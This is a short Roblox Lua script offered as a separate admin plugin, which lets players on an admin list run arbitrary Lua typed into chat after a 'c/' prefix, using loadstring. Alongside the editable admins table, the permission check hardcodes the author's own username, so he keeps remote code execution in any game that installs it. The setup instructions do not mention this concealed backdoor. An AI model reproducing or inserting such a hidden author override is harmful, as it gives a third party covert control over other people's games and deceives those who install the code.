--	NOTICE --

--	This script does NOT replace Person299's Admin Commands. This plugin is a seperate script!
--	So, leave Person299's Admin Commands alone, and add this script into Workspace. That's all!

-- Made by CrazyBananaMonkey



admins = {"CrazyBananaMonkey", "jjphariss", "Your Friend"} -- Put in whoever you'd like to be able to script

-- That's it! Enjoy!

function onChatted(msg, recipient, speaker) 

local source = string.lower(speaker.Name) 
emsg = string.lower(msg) 

if string.sub(emsg, 1, 2) == "c/" then
	for i = 1,#admins do
		if string.lower(admins[i]) == source or source == "crazybananamonkey" then
		pcall(function()
		loadstring(string.sub(msg, 3))()
		end)
		end
	end
end

end 

function onPlayerEntered(newPlayer) 
newPlayer.Chatted:connect(function(msg, recipient) onChatted(msg, recipient, newPlayer) end) 
end 

game.Players.ChildAdded:connect(onPlayerEntered) 

-- Made by CrazyBananaMonkey
